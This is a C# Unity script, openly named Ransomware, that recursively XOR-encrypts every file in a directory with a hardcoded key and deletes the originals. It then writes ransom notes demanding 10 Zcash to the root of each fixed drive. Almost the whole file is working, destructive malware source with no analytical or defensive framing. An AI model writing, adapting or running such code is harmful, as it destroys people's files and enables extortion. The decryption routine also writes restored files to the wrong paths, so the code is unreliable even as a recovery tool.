Using System.IO;
using UnityEngine;

public class Ransomware : MonoBehaviour
{
    private static byte[] ransomKey = System.Text.Encoding.UTF8.GetBytes("R00tgirlxox!@#");
    private static string encryptedExtension = ".encrypted";
    private static decimal ransomAmount = 10m; // 10 Zcash

    public static void EncryptFiles(string directory)
    {
        foreach (var file in Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories))
        {
            if (Path.GetFileName(file) != "Ransomware.exe")
            {
                byte[] fileBytes = File.ReadAllBytes(file);
                byte[] encryptedBytes = new byte[fileBytes.Length];

                for (int i = 0; i < fileBytes.Length; i++)
                {
                    encryptedBytes[i] = (byte)(fileBytes[i] ^ ransomKey[i % ransomKey.Length]);
                }

                File.WriteAllBytes(file + encryptedExtension, encryptedBytes);
                File.Delete(file);
            }
        }
        GenerateRansomNotes();
    }

    public static void DecryptFiles(string directory)
    {
        foreach (var file in Directory.GetFiles(directory, "*" + encryptedExtension, SearchOption.AllDirectories))
        {
            byte[] fileBytes = File.ReadAllBytes(file);
            byte[] decryptedBytes = new byte[fileBytes.Length];

            for (int i = 0; i < fileBytes.Length; i++)
            {
                decryptedBytes[i] = (byte)(fileBytes[i] ^ ransomKey[i % ransomKey.Length]);
            }

            File.WriteAllBytes(Path.GetFileNameWithoutExtension(file), decryptedBytes);
            File.Delete(file);
        }
    }

    public static bool CheckForRansomNotes(string directory)
    {
        foreach (var file in Directory.GetFiles(directory, "*.ransom", SearchOption.AllDirectories))
        {
            string ransomNote = File.ReadAllText(file);
            Debug.LogWarning(ransomNote);

            return true;
        }

        return false;
    }

    private static void GenerateRansomNotes()
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (drive.DriveType == DriveType.Fixed)
            {
                string ransomNoteText = $"Your files have been encrypted. Pay {ransomAmount} Zcash to address [address] to retrieve your files. Enter the decryption key [decryption_key] to unlock your files.\n\nContact us at [email] with your Zcash payment receipt and unique ID [id] to receive your decryption key.";
                File.WriteAllText(drive.RootDirectory.FullName + "RANSOM_NOTE_README.ransom", ransomNoteText);
            }
        }
    }
}
